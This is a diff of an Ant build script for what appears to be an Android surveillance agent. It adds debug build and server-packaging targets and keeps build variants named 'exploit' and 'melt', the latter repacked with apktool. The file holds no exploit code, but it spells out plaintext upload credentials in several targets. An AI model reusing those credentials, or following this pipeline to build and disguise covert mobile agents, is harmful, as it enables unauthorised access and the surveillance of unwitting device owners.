@@ -35,6 +35,7 @@
 		</classpath>
 	</taskdef>
 
+
 	<copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false" />
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
@@ -127,7 +128,7 @@
 		<property file="build.number" />
 		<echo message="timestamp ${timestamp.BUILD}" />
 		<echo message="build.number ${build.number}" />
-		<delete dir="enc"/>
+		<delete dir="enc" />
 	</target>
 
 	<!-- = = = = = = = = = = = = = = = = =
@@ -147,7 +148,7 @@
 			<switch value="@{kind}">
 				<case value="debug">
 					<echo message="set debug" />
-					
+
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -157,7 +158,7 @@
 				</case>
 				<case value="release">
 					<echo message="set release" />
-					
+
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -167,7 +168,7 @@
 				</case>
 				<case value="merge">
 					<echo message="set merge" />
-					
+
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -177,7 +178,7 @@
 				</case>
 				<case value="merge_debug">
 					<echo message="set merge" />
-				
+
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -187,7 +188,7 @@
 				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
-				
+
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
 					<var name="iscamera" value="false" />
@@ -245,7 +246,7 @@
 					<filter token="RNDMSG" value="${randomKeyMessages}" />
 				</filterset>
 			</copy>
-			
+
 			<antcall target="libsnoexp" />
 
 		</sequential>
@@ -306,19 +307,6 @@
 		</exec>
 
 	</target>
-
-	<target name="distold" depends="build">
-		<input message="Version (8.1_RC1)?" addproperty="do.version" defaultvalue="8.1_RC1" />
-		<mkdir dir="../dist/${do.version}" />
-		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true" />
-		<zip destfile="../dist/${do.version}/android_sources.zip" basedir="." />
-		<checksum>
-			<fileset dir="../dist/${do.version}/">
-				<include name="*" />
-			</fileset>
-		</checksum>
-	</target>
-
 
 	<target name="help">
 		<echo>ant build :  full build</echo>
@@ -431,6 +419,38 @@
 		<antcall target="merge" />
 	</target>
 
+	<target name="build_debug" depends="init">
+
+		<for list="default" param="osversion">
+			<sequential>
+				<echo message="==============" />
+				<echo message="===  DEBUG ===" />
+				<echo message="==============" />
+				<echo>Version @{osversion}</echo>
+
+				<var name="kind" value="debug" />
+
+				<echo>clean</echo>
+				<antcall target="clean" />
+
+				<echo message="bin/@{osversion}/${kind}/core.android" />
+				<set-cfg osversion="@{osversion}" kind="${kind}" />
+				<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
+				<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+
+				<echo>call debug</echo>
+				<antcall target="debug" inheritAll="false" />
+				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+				<var name="filename" value="bin/android_deviceinfo-debug.apk" />
+
+				<mkdir dir="output/${kind}/" />
+				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
+				<copy file="${filename}" toFile="server/core/core.android.default.apk" overwrite="true" />
+			</sequential>
+
+		</for>
+	</target>
+
 	<target name="repackmerge">
 		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
 			<arg line="d -r -s -f core.android.melt.apk" />
@@ -495,6 +515,32 @@
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
 
+	<target name="servercoredebug">
+		<delete dir="server/core" />
+		<mkdir dir="server/core" />
+
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="server/template" excludes="version" />
+		</copy>
+
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="server/template" includes="version" />
+			<filterset>
+				<filter token="VERSION" value="${version}" />
+			</filterset>
+		</copy>
+
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="output/release/" />
+		</copy>
+
+		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
+		<copy file="output/debug/core.android.default.apk" toDir="server/core" overwrite="true" />
+		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
+
+		<zip destfile="server/android_${version}.zip" basedir="server/core" />
+	</target>
+
 	<target name="dist" depends="init">
 		<echo>version = ${version}</echo>
 		<echo>release = ${do.release}</echo>
@@ -524,6 +570,11 @@
 	<target name="testcastore" depends="build">
 		<antcall target="servercore" />
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+
+	<target name="updatecastoredebug" depends="build_debug,servercoredebug">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+		<echo>ruby antlibs/rcs-core.rb -f RCS_0000001610 -n android -d rcs-castore -u zeno -p zenop123 -b build.params -o build/install.zip</echo>
 	</target>
 
 	<target name="updatecastore">
